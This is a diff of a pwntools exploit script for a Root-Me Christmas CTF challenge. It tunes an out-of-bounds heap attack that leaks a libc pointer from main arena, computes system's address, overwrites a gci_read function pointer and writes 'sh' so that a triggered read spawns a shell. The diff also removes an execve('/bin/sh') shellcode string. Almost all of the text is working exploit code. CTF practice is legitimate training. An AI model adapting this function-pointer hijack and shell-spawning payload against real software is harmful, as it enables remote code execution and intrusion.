@@ -7,11 +7,11 @@ libc = ELF("./libc.so.6")
 ld = ELF("./ld-linux-x86-64.so.2")
 
 context.binary = exe
-context.terminal = ["tmux", "splitw", "-h", "-l", "110"]
+context.terminal = ["alacritty", "-e", "bash", "-c"]
 context.delete_corefiles = True
 context.rename_corefiles = False
 host = 'dyn-01.xmas.root-me.org'
-port = 33492
+port = 20690
 
 gdbscript = '''
 init-pwndbg
@@ -185,35 +185,20 @@ def main():
             payload += 'inc rax; \n'
         return payload
     
-    # good luck pwning :)
-
-    sc = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00'
-    0x6873
-    code = set_gift_max(136)
+    code = set_gift_max(150)
     code += init_gift_list()
-    code += set_gift_max((1<<64) - 1)
+    code += set_gift_max((1<<64) - 1) # allows OOB access
     code += set_gift_to_add(0xcafebabe)
     code += add_gift()
-    code += set4(140, 0x6873) # sh
-    code += get8(97504) # libc
-    code += get8(97504) # libc
-    # code += 'sub rax, 0x203b20 ;\n' # libc base
-    # code += 'sub rax, 0x40100000 ;\n' # rwx segment
-    # code += 'mov rbx, rax ;\n'
-    # code += get8(12) # heap
-    # code += 'sub rax, 0x420 ;\n' # heap base
-    # code += 'sub rbx, rax ;\n'
-    # code += 'shr rbx, 4 ;\n'
-    # code += 'mov rax, rbx; \n' # offset
-    # code += copy_offset_rax(sc)
-    # code += get8(92336) # libc    
-    code += 'sub rax, 0x1ab3e0 ;\n' # system
-    # code += 'sub rax, 0x40100000 ;\n' # rwx segment    
-    code += set8_val_rax(5228)
-    code += get_gift_max()
+    code += set4(152, 0x6873) # overwrite the first bytes of uc_engine with "sh"
+    code += get8(97516)  # ptr to libc (main arena)
+    code += 'sub rax, 0x1ab3e0 ;\n' # @system
+    code += set8_val_rax(5240)  # overwrite pointer to gci_read
+    code += get_gift_max() # trigger a read
     # print(code)
 
     code = asm(code)
+    code += b'A' * (150*4 - len(code)) # padding to allocate gift list in tcache chunk
     
     io.sendlineafter(b'Code length (16384 max): ', str(len(code)).encode())
     io.sendafter(b'Enter your code: ', code)
